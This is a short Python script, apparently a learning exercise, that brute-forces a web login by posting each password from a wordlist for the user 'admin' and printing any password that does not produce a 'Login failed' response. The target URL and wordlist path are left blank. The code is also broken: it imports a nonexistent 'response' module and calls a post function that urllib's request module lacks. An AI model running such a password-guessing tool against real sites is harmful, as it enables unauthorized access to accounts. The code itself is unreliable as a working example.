from urllib import request

import response as response

target_url = ""
data_dict = {"username": "admin", "password": "", "login": "submit"}

with open("file to list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = request.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of file. No passwords were discovered")
